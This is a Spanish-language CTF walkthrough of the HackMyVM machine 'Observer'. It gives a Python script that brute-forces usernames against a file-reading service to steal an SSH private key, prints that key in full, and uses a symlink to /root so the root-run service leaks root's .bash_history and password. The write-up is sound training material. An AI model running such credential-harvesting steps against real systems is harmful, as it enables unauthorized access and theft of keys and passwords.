---
layout: post
title: Observer
date: 2023-09-01
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, Brute Force, Credentials]
---

# Observer [ Hack My VM ]
![light mode only](/assets/img/imgs/observer/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/observer/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Thu Aug 31 07:43:29 2023 as: nmap -sCV -p22,3333 -oN targeted 192.168.1.113
Nmap scan report for 192.168.1.113
Host is up (0.00059s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 06c9a88a1cfd9b108fcf0b1f0446aa07 (ECDSA)
|_  256 3485c5fd7b26c38b68a29f4c5c665e18 (ED25519)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 31 Aug 2023 11:44:24 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
|     <!-- EkXBAkjQZLCtTMtTCoaNatyyiNKAReHMV -->
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 31 Aug 2023 11:43:59 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Thu, 31 Aug 2023 11:43:59 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|_    <!-- gmotaFetHsbZRjxAwnwekrBEmfdzdcHMV -->
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.93%I=7%D=8/31%Time=64F07CF5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\nDat
SF:e:\x20Thu,\x2031\x20Aug\x202023\x2011:43:59\x20GMT\r\nContent-Length:\x
SF:2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\
SF:x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQleQYhYzRy
SF:WJjPjzpfRFEHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\nDat
SF:e:\x20Thu,\x2031\x20Aug\x202023\x2011:43:59\x20GMT\r\nContent-Length:\x
SF:2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\
SF:x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20gmotaFetHsbZRjxAwnw
SF:ekrBEmfdzdcHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Termi
SF:nalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,DF,"H
SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2031\x20Aug\x202023\x2011:44:24
SF:\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x20ports,/Trinity\.
SF:txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20EkXBAkjQZLCtTMtTCoaNatyyiNKAR
SF:eHMV\x20-->");
MAC Address: 08:00:27:BC:75:89 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 31 07:45:15 2023 -- 1 IP address (1 host up) scanned in 106.01 seconds
```

Vemos que el puerto `22` está abierto, pero no tenemos credenciales válidas por el momento.

### Inspección
Vemos que **`NMAP`** nos dice que el puerto **`3333`** está abierto, pero no sabemos lo que es. Vamos a verlo:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Observer]
└─# curl http://192.168.1.113:3333/
OBSERVING FILE: /home/ NOT EXIST 


<!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
```

Vemos un mensaje que nos dice "**`OBSERVANDO EL FICHERO: /home/{: .filepath } NO EXISTE`**". Vamos a probar a complementar la `URL` y a pasarle un nombre de un archivo:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Observer]
└─# curl http://192.168.1.113:3333/test
OBSERVING FILE: /home/test NOT EXIST 


<!-- gmotaFetHsbZRjxAwnwekrBEmfdzdcHMV -->
```

Es curioso, siempre busca en el directorio **`/home/`{: .filepath }**, podemos tratar de hacer **`Brute Force`** (**`Fuerza Bruta`**) a un usuario e intentar conseguir su clave de **`SSH`**.

# Movimiento Lateral
### Shell
Para llevar la idea anterior a cabo me creé un **`script`** en **`Python`**, que a partir de un diccionario irá probando varios nombres de usuario. También intentaremos acceder a la carpeta **`~/.ssh/`{: .filepath }** y extraer el fichero **`id_rsa`**. Vamos a ello:

```python
import requests

spaces = " " * 60

with open("/usr/share/wordlists/external/SecLists/Usernames/xato-net-10-million-usernames.txt", "r") as f:
        lines = f.readlines()
        for username in lines:
                username = username.replace("\n", "")
                r = requests.get(f"http://192.168.1.113:3333/{username}/.ssh/id_rsa")
                if "NOT EXIST" in r.text:
                        print(f"[-] {username}{spaces}", end="\r")
                else:
                        print(f"[+] Username Found: {username}\nResponse:\n{r.text}")
                        break
```

Como vemos este **`script`** está abriendo el diccionario **`xato-net-10-million-usernames.txt`** de [**`SecLists`**](https://github.com/danielmiessler/SecLists) y está iterando por todas y cada una de las líneas, haciendo una petición a **`http://192.168.1.113:3333/`**, junto al nombre de usuario y el fichero antes mencionado.

Vamos a probarlo:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Observer/exploits]
└─# python3 brute_force.py
[+] Username Found: jan                                                      
Response:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Como estamos viendo, nos ha sacado el nombre de usuario **`jan`** y su clave privada de **`SSH`**, vamos a guardarla en un fichero y a utilizarla para acceder a la máquina:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Observer]
└─# chmod 600 jan.id_rsa
```

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Observer]
└─# ssh -i jan.id_rsa jan@192.168.1.113
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug 31 14:28:53 2023 from 192.168.1.110
jan@observer:~$
```

¡Estupendo! Estamos dentro de la máquina como **`Jan`**.

### Subida de privilegios
Ahora que estamos dentro debemos conseguir el **control total** de la máquina, para ello comenzaremos por enumerar un poco la máquina. Vamos a ver qué comandos podemos realizar como **`Jan`**:

```sh
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
```

Vemos que podemos ejecutar el binario **`systemctl`** con los argumentos "**`-l status`**" como si fuéramos **`root`** y sin necesidad de contraseña. Vamos a verlo:

```sh
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Fri 2023-09-01 14:54:17 CEST; 21min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─355 /usr/sbin/cron -f
           │ │ ├─366 /usr/sbin/CRON -f
           │ │ ├─381 /bin/sh -c /opt/observer
           │ │ └─388 /opt/observer
           │ ├─dbus.service
           │ │ └─[...]
```

Vemos que el binario **`/opt/observer`{: .filepath }** está siendo ejecutado por **`root`**, por lo que si se trata del servicio que hemos visto en el puerto **`3333`** significa que podemos leer cualquier fichero.

Para probar mi teoría crearé un **`Symbolic Link`** (**`Link Simbólico`**) a la carpeta **`/root/`{: .filepath }**, de tal manera que cuando vayamos al puerto **`3333`** y especifiquemos la carpeta con el **`Link Simbólico`** podremos ver cualquier fichero de dicha carpeta.

Para entendernos mejor, vamos a verlo en acción. Comencemos por crear el **`Symbolic Link`**:

```sh
jan@observer:~$ ln -s /root root
jan@observer:~$ ls -la
total 40
drwx------ 4 jan  jan  4096 sep  1 15:24 .
drwxr-xr-x 3 root root 4096 ago 21 20:19 ..
-rw------- 1 jan  jan   826 ago 31 15:11 .bash_history
-rw-r--r-- 1 jan  jan   220 ago 21 20:19 .bash_logout
-rw-r--r-- 1 jan  jan  3526 ago 21 20:19 .bashrc
drwxr-xr-x 3 jan  jan  4096 ago 21 20:21 .local
-rw-r--r-- 1 jan  jan   807 ago 21 20:19 .profile
lrwxrwxrwx 1 jan  jan     5 sep  1 15:24 root -> /root
drwx------ 2 jan  jan  4096 ago 21 20:25 .ssh
-rw------- 1 jan  jan    24 ago 21 20:21 user.txt
-rw------- 1 jan  jan    54 ago 21 20:21 .Xauthority
```

Ahora la carpeta **`/home/root/`{: .filepath }** apunta a **`/root/`{: .filepath }**, tratemos de acceder a través del servicio:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Observer]
└─# curl "http://192.168.1.113:3333/jan/root/.bash_history"
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go 
mv observer /opt
ls -l /opt/observer 
crontab -e
nano root.txt
chmod 600 root.txt 
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck1ng0bs3rv3rs
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt 
cd /home/jan
ls -la
cat user.txt 
su jan
reboot
shutdown -h now
clear
cd /
clear
cat /root/root.txt
cat /home/jan/user.txt
clear
cat /root/root.txt
cat /home/jan/user.txt
exit
```

Entre todos los comandos realizados por **`root`** podemos encontrar su contraseña, vamos a iniciar sesión como **`root`**:

```sh
jan@observer:~$ su root
Contraseña: fuck1ng0bs3rv3rs
root@observer:/home/jan#
```
